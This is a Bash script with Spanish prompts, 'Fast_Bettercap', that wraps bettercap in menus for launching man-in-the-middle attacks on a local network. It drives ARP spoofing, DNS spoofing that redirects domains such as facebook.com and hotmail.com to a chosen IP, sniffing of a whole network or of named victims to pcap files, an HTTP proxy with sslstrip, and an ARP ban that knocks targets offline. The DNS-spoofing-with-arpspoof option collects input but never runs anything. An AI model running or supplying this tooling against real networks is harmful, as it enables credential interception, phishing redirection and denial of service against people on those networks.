#!/bin/bash
#Fast_Bettercap es un script en bash que busca simplificar el uso del nuevo bettercap para aquellas personas que no saben como utilizarla.
#No busco robarme el crédito de esta maravillosa herramienta llamada BETTERCAP, simplemente facilitar su uso.
#Esta es la version 0.9 y estoy re diseñando las funciones y menú de selección para hacerlo mas completo.
#No soy un programador, ni me considero un hacker, solo soy un entusiasta de informatica.
#Por si quieren contactarme: hablemosdehacking@gmail.com
#Acepto sugerencias y criticas.
#John-Wick



BANNER() {
	clear;echo;
echo -e '\e[1;33m   -::-.`                                                   `...`     \e[0m'
echo -e '\e[1;33m  .shhhhhhyo/-`           \e[1;37mFast Bettercap V0.9\e[1;33m          .:+syhhhhhs.  \e[0m'
echo -e '\e[1;33m `yhhhhhhhhhhhys+-`         \e[1;37m By:> John-Wick\e[1;33m        .:+syhhhhhhhhhhhs;\e[0m'
echo -e '\e[1;33m :hhhhhhhhhhhhhhhhhyo/-.                     `.:+oyhhhhhhhhhdhhhhhhh- \e[0m'
echo -e '\e[1;33m +hhhhhh\e[1;37mMMMMNN\e[1;33mmdhhhhhhhhyso+/:--.......-:/+oyyhhhhhhhhdm\e[1;37mNMMMMM\e[1;33mmhhhhh/ \e[0m'
echo -e '\e[1;33m /hhhhhhd\e[1;37mNMMMMMMMN\e[1;33mmdhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhm\e[1;37mNMMMMMMMMN\e[1;33mhhhhhh/ \e[0m'
echo -e '\e[1;33m -hhhhhhhhhdm\e[1;37mNMMMMMMMN\e[1;33mdhhhhhhhhhhhhhhhhhhhhhhhhdm\e[1;37mMMMMMMMNN\e[1;33mmdhhhhhhhh- \e[0m'
echo -e '\e[1;33m  shhhhhhhhhhhhhhhdddd\e[1;37mmm\e[1;33mdhhhhhhhhhhhhhhhhhhhhh\e[1;37mmmm\e[1;33mdddhhhhhhhhhhhhhhhs  \e[0m'
echo -e '\e[1;33m  `yhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhy`  \e[0m'
echo -e '\e[1;33m   `oyhhhhhhhhhhhhhhhhhhhhhhhyyyyssssyyyyhhhhhhhhhhhhhhhhhhhhhhhyo`   \e[0m'
echo -e '\e[1;33m     .:+ooooo++++///::--...``            ``...--:://+++oooooo+/:.     \e[0m'
echo -e '\e[1;33m                                ``.```  \e[0m';echo;
}

DEPENDENCIAS() {
clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V0.9 ]]]\e[0m";echo;sleep 0.2
if [ -f /root/bettercap.history ]; then
	sudo rm /root/bettercap.history 2> /dev/null
fi

if ! hash bettercap 2>/dev/null; then
		echo -e "\e[0;34m[[[\e[1;37mBettercap\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
		exit
	else
        echo -e "\e[0;34m[[[\e[1;37mBettercap\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
fi

if ! hash gnome-terminal 2>/dev/null; then
		echo -e "\e[0;34m[[[\e[1;37mGnome-terminal\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
		exit
	else
        echo -e "\e[0;34m[[[\e[1;37mGnome-terminal\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
fi

if ! hash netdiscover 2>/dev/null; then
		echo -e "\e[0;34m[[[\e[1;37mNetdiscover\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
		exit 
	else
        echo -e "\e[0;34m[[[\e[1;37mNetdiscover\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
fi

if ! hash nmap 2>/dev/null; then
		echo -e "\e[0;34m[[[\e[1;37mNmap\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
		exit
	else
        echo -e "\e[0;34m[[[\e[1;37mNmap\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
fi

if ! hash dnsspoof 2>/dev/null; then
		echo -e "\e[0;34m[[[\e[1;37mdnsspoof\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
		exit
	else
        echo -e "\e[0;34m[[[\e[1;37mdnsspoof\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
    fi

if ! hash arpspoof 2>/dev/null; then
		echo -e "\e[0;34m[[[\e[1;37marpspoof\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
		exit
	else
        echo -e "\e[0;34m[[[\e[1;37marpspoof\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
fi
MENU_PRINCIPAL
}

SAVECAPTURE() {
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
	read SINO
	while [[ -z "$SINO" ]]; do
		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
		read SINO
	done
}

FILEPATH() {
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
	read SALIDA_FAST_BETTERCAP
		while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
				echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
				read SALIDA_FAST_BETTERCAP
		done
}

SET_TARGET() {
	sleep 2 &
PID=$!
i=1
sp="/-\|"
echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Buscando interfaces disponibles.. \e[0m" $(echo -e "\e[0;31m  "  )
while [ -d /proc/$PID ]
		do
			sleep 0.1
			printf "\b${sp:i++%${#sp}:1}"
done
	echo; echo -e "\e[0;33m ";  iwconfig 2>&1 | grep 802.11 | awk '{print "* "$1," <-------->  "$4,$5,$6,$7}'
	echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar:> \e[0m"; tput sgr0
	read INTERFACE
	INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
	while [ -z "$INTERFACE" -o "$INTERFACES" != "$INTERFACE" ]; do
		echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o la interfaz no esta disponible..\e[0m";
		echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar:> \e[0m"; tput sgr0
		read INTERFACE
		INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
	done
}

HOSTUPBETTERCAP() {
	SET_TARGET
	gnome-terminal -t Bettercap Network Devices --geometry=170x35 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; ticker on " && clear; MENU_PRINCIPAL;
}
 
HOSTUPNETDISCOVER() {
	SET_TARGET;
	echo -e "\e[0;32m " | gnome-terminal -t Netdiscover Network Devices --geometry=100x30 --zoom=1 -- netdiscover -i $INTERFACE && clear; MENU_PRINCIPAL;
}

HOST_UP() {
	echo;echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Bettercap\e[0m"
	echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Netdiscover\e[0m"
	echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Menu principal\e[0m"
	echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Betteacp_Network_Devices:> \e[0m"; tput sgr0
	read HOSTUPOPCION
while [[ -z "$HOSTUPOPCION" || "$HOSTUPOPCION" != @(0|1|2|99|) ]]; do
		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Network_Devices:> \e[0m"; tput sgr0
		read HOSTUPOPCION
done
		while true;do
				case $HOSTUPOPCION in
					0) HOSTUPBETTERCAP
					;;
					1) HOSTUPNETDISCOVER
					;;
					2) MENU_PRINCIPAL
					;;
					99) exit
					;;
				esac
		done
}

ARPSPOOFDNSSPOOF() {
SET_TARGET;
GT=$(netstat -rn | egrep "$INTERFACE"| awk '{print $2}'|grep 192)

echo;echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m ArpSpoof & DnsSpoof. \e[0m";
echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ip de la victima:> \e[0m"; tput sgr0
read IPVICTIMA
echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Su gateway ($GT):> \e[0m"; tput sgr0
read GATEWAY
echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
read IPDIRECTION
while [[ -z "$IPVICTIMA" || -z "$GATEWAY" || -z "$IPDIRECTION" ]]; do
		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado uno de los dos campos vacio, vuelva a intentarlo..\e[0m" 
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ip de la victima:> \e[0m"; tput sgr0
		read IPVICTIMA
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Su gateway ($GT):> \e[0m"; tput sgr0
		read GATEWAY
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
		read IPDIRECTION
done


}



BETTERCAP() { 
	SET_TARGET;
	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede suplantar varios dominios separados por \",\" Ejem: facebook.com, hotmail.com \e[0m";
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que dominios desea suplantar:> \e[0m"; tput sgr0
	read DOMAINOPCION
	DO=$DOMAINOPCION
		while [[ -z "$DOMAINOPCION"  ]]; do 
				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
				echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que dominios desea suplantar:> \e[0m"; tput sgr0
				read DOMAINOPCION
		done
IPDEFUAL=$(hostname -I)
echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS ($IPDEFUAL):> \e[0m"; tput sgr0
read IPDIRECTION
IP=$IPDIRECTION
while [[ -z "$IPDIRECTION" ]]; do
	echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m"
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
	read IPDIRECTION
done
	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;32m DNS.SPOOF-ALL:\e[0;37m si es verdadero, el módulo responderá a cada solicitud DNS\e[0m"
	echo -e "\e[0;37m de lo contrario, solo responderá a la que apunta a la PC local.\e[0m";
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Dns spoof all (false/true):> \e[0m"; tput sgr0
	read SPOOFALL
	TF=$SPOOFALL
		while [[ -z "$SPOOFALL" || "$SPOOFALL" != @(false|true|) ]]; do
				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio o no escribio bien (false/true)\e[0m"
				echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Dns spoof all (false/true):> \e[0m"; tput sgr0
				read SPOOFALL
		done
echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea lanzar dns.spoof al toda la red(si/no):> "; tput sgr0
	read TARGETOPCION
while [[ -z "$TARGETOPCION" || "$TARGETOPCION" != @(si|no|) ]]; do
	echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio o no escribio bien (si/no)\e[0m"
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea lanzar dns.spoof al toda la red(si/no):> "; tput sgr0
	read TARGETOPCION
done
		 case $TARGETOPCION in
			[si]* ) gnome-terminal -t "DNS SPOOF" --geometry=170x35 --zoom=1 -- bettercap -iface $INTERFACE -eval "set dns.spoof.domains $DO; set dns.spoof.address $IP; set dns.spoof.all $TF" -autostart  "dns.spoof, arp.spoof, events.stream " && clear;MENU_PRINCIPAL;
			;;
			[no]* ) echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede agregar mas de una direccion ip separadas por \",\" Ejemplo: 192.X.X.X, 192.X.X.X\e[0m"
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que ip desea agregar:> "; tput sgr0
	read IPARPOPCION
while [[ -z "$IPARPOPCION" ]]; do
	echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo vacio..\e[0m";echo;
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que ip desea agregar:> "; tput sgr0
	read IPARPOPCION
done
			gnome-terminal -t "DNS SPOOF" --geometry=170x35 --zoom=1 -- bettercap -iface $INTERFACE -eval "set dns.spoof.domains $DO; set dns.spoof.address $IP; set dns.spoof.all $TF; set arp.spoof.targets $IPARPOPCION" -autostart  "dns.spoof, arp.spoof, events.stream" && clear;MENU_PRINCIPAL;
			;;	
			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/no\e[0m";
			;;
	esac
}

BAN_TARGET() {
	SET_TARGET;
	sleep 0.5 ;echo;
	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede banear mas de un objetivo. Ejemplo: 192.X.X.X,192.X.X.X\e[0m"
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Target_Ban:> \e[0m"; tput sgr0
	read TARGETS
		while [[ -z "$TARGETS" ]]; do
			   echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo \"target_ban\" esta vacio.\e[0m";echo;
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Target_Ban:> \e[0m"; tput sgr0
			   read TARGETS
		done
	gnome-terminal -t "Baneando a: -----> $TARGETS" --geometry=68x6 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval 'arp.ban on; set arp.spoof.targets $TARGETS; set ticker.commands "clear; !echo "ARP en el modo de prohibición..""; set ticker.period 1' -autostart "ticker, arp.spoof" && clear;MENU_PRINCIPAL;
}

SNIFFALL() { 				
SET_TARGET;SAVECAPTURE
	 case $SINO in
			[s]* ) FILEPATH;
					gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; net.sniff on; arp.spoof on; events.clear" && clear; MENU_PRINCIPAL;
			;;
			[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.sniff on; arp.spoof on; events.clear" && clear; MENU_PRINCIPAL;
			;;	
			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
			;;
	esac
}

SNIFFTARGET() {
	SET_TARGET;SAVECAPTURE;
	 case $SINO in
			[s]* ) 	FILEPATH;
					echo;echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 1: 192.168.1.2-4 (rango)\e[0m"
					echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 2 192.168.1.3,192.168.1.5 (objetivos especificos)\e[0m";echo;
					echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
	 				read SNIFFTARGETOPCION
					while [[ -z "$SNIFFTARGETOPCION"  ]]; do 
							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio...\e[0m" 
							echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
							read SNIFFTARGETOPCION
					done
							gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets $SNIFFTARGETOPCION; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;

			;;
		[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
			;;	
			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
			;;
	esac
}

SNIFFLOCAL() {
	gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -eval "set net.sniff.local true; events.clear; net.sniff on; arp.spoof on" && clear; MENU_PRINCIPAL;

}

SSLSTRIPONOFF() {
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
	read SSLTRIPOPCION
		while [[ -z "$SSLTRIPOPCION"  ]]; do 
				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
				echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
				read SSLTRIPOPCION
		done
}


HTTPPROXY() {
SET_TARGET;SAVECAPTURE;
	 case $SINO in
			[s]* ) FILEPATH;SSLSTRIPONOFF
							case $SSLTRIPOPCION in
									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
									;;
									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
									;;
								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";SSLSTRIPONOFF;
									;;
							esac
			;;
		[n]* )  echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
	 			read SSLTRIPOPCION
					while [[ -z "$SSLTRIPOPCION"  ]]; do 
							echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
							echo -n -e "\e[0;34m[[[\e[0;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
							read SSLTRIPOPCION
					done
							case $SSLTRIPOPCION in
									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
									;;
									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL; 
									;;
								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";
									;;
							esac
			;;	
			* ) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";
			;;
	esac
}

DNSSPOOFMENU() {
	clear;BANNER;
	echo;echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Bettercap\e[0m"
	echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Arpspoof & Dnsspoof\e[0m"
	echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Menu principal\e[0m"
	echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Betteacp_DnsSpoof:> \e[0m"; tput sgr0
	read DNSOPCION
while [[ -z "$DNSOPCION" || "$DNSOPCION" != @(0|1|2|99|) ]]; do
		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Dnsspoof:> \e[0m"; tput sgr0
		read DNSOPCION
done
		while true;do
				case $DNSOPCION in
					0) BETTERCAP
					;;
					1) ARPSPOOFDNSSPOOF
					;;
					2) MENU_PRINCIPAL
					;;
					99) exit
					;;
				esac
		done

}

SNIFF_MENU() {
	clear;BANNER;
	echo;echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff all (sniffear toda la red ) \e[0m"
	echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Sniff target (Snifear uno o mas objetivos) \e[0m"
	echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Sniff local (Snifear mi trafico local) \e[0m"
	echo -e "\e[0;34m[[[\e[1;32m3. \e[0;34m]]]\e[0;37m Menu principal\e[0m"
	echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Betteacp_Sniff:> \e[0m"; tput sgr0
	read SNIFFOPCION
while [[ -z "$SNIFFOPCION" || "$SNIFFOPCION" != @(0|1|2|3|99|) ]]; do
		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Sniff:> \e[0m"; tput sgr0
		read SNIFFOPCION
done
		while true;do
				case $SNIFFOPCION in
					0) SNIFFALL
					;;
					1) SNIFFTARGET
					;;
					2) SNIFFLOCAL
					;;
					3) MENU_PRINCIPAL
					;;
					99) exit
					;;
				esac
		done
}

MENU_PRINCIPAL() { echo;BANNER;
echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff (Snifear la red) \e[0m"
echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Network devices (Dispositivos en la red )\e[0m"
echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Ban target (Banear uno o mas objetivos)\e[0m"
echo -e "\e[0;34m[[[\e[1;32m3. \e[0;34m]]]\e[0;37m Transparent HTTP proxy (Analizar el tráfico HTTP)\e[0m"
echo -e "\e[0;34m[[[\e[1;32m4. \e[0;34m]]]\e[0;37m DNS spoofing (Burlar al DNS)\e[0m"
echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap:> \e[0m"; tput sgr0
read MENUOPCION
while [[ -z "$MENUOPCION" || "$MENUOPCION" != @(0|1|2|3|4|99|) ]]; do
		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Elija una opcion :> \e[0m"; tput sgr0
		read MENUOPCION
done
		while true;do
				case $MENUOPCION in
					0) SNIFF_MENU
					;;
					1) HOST_UP
					;;
					2) BAN_TARGET
					;;
					3) HTTPPROXY
					;;
					4) DNSSPOOFMENU
					;;
					99) exit
					;;
				esac
		done
}


																													

if [ "$EUID" -ne 0 ]; then
		clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V0.2 ]]]\e[0m";echo;sleep 0.5
		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m  Por favor corra el script con privilegios root.\e[0m"
		echo
  		exit 0
  	else
  		DEPENDENCIAS
fi
